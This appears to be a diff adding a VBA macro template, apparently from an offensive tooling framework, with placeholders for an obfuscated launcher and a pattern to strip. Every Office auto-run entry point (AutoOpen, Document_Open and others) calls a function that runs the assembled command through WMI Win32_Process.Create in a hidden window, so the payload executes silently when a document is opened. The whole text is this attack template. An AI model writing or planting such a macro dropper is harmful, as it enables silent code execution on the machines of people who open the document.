@@ -1,0 +1,25 @@
+Sub AutoOpen()
+    Debugging
+End Sub
+Sub Auto_Open()
+    Debugging
+End Sub
+Sub DocumentOpen()
+    Debugging
+End Sub
+Sub Document_Open()
+    Debugging
+End Sub
+
+Public Function Debugging() As Variant
+	{{ obfuscated_launcher}}
+	str = Replace(str, "{{ pattern }}", "")
+	Const HIDDEN_WINDOW = 0
+	strComputer = "."
+	Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+	Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+	Set objConfig = objStartup.SpawnInstance_
+	objConfig.ShowWindow = HIDDEN_WINDOW
+	Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+	objProcess.Create str, Null, objConfig, intProcessID
+End Function
